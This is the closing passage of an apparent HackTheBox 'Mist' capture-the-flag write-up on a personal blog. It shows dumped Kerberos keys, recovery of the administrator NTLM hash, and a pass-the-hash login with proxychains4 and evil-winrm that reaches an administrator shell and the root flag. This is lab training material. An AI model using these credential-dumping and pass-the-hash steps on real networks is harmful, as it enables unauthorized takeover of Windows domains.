class="line">svc_ca$:aes128-cts-hmac-sha1-96:9777cf891b00a2df16c65c3e6f74c100</span><br><span class="line">svc_ca$:des-cbc-md5:3b326d912fc87cb6</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure></div>

<p>And we got it! <code>b46782b9365344abdff1a925601e0385</code></p>
<p>Now we can go on the machine an claim our root flag:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/hackthebox/mist]</span><br><span class="line">└─$ proxychains4 evil-winrm -u administrator -H <span class="string">&#x27;b46782b9365344abdff1a925601e0385&#x27;</span> -i 192.168.100.100</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine                                       </span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion                                                         </span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:5985  ...  OK</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">cd</span> ../desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; <span class="built_in">type</span> root.txt</span><br><span class="line">2d158e0a76edbd******************</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; </span><br></pre></td></tr></table></figure></div>

<p>That was it for this writeup. And I can say that this was the hardest machine I have ever played on HackTheBox. Was really fun and I learned a lot.<br>-0xkujen</p>

        </div>

        
            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Hackthebox: Mist</li>
        <li><strong>Author:</strong> Foued SAIDI</li>
        <li><strong>Created at
                :</strong> 2024-10-25 14:15:02</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2024-10-26 16:43:09
            </li>
        
        <li>
            <strong>Link:</strong> https://kujen5.github.io/2024/10/25/Hackthebox-Mist/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

            </div>
        

        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2024/10/19/Hackthebox-Editorial/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">Hackthebox: Editorial</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">On this page</div>
        <div class="page-title">Hackthebox: Mist</div>
        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
        </div>
        
            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>







<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/libs/anime.min.js"></script>

        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


</body>
</html>
